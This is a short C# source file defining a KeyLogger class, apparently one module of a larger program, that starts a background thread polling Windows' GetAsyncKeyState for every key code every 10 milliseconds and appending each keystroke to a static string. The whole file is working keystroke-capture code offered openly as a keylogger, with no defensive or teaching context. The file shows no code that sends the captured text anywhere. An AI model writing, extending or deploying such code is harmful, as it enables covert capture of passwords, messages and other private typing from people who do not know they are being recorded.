using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SnS.Classes
{
    class KeyLogger
    {
        public static string szText = String.Empty;

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int i);

        private static Thread thLocalThread;

        public static void initKeyLogger()
        {
            thLocalThread = new Thread(repeatAction);
            thLocalThread.Start();
        }

        public static void repeatAction()
        {
            while (true)
            {
                Thread.Sleep(10);

                for (int i = 0; i < 255; i++)
                {
                    int nKeyState = GetAsyncKeyState(i);
                    if (nKeyState == 1 || nKeyState == -32767)
                    {
                        szText += Functions.Functions.filterInput(((Keys)i).ToString());
                    }
                }
            }
        }
        
        
    }
}
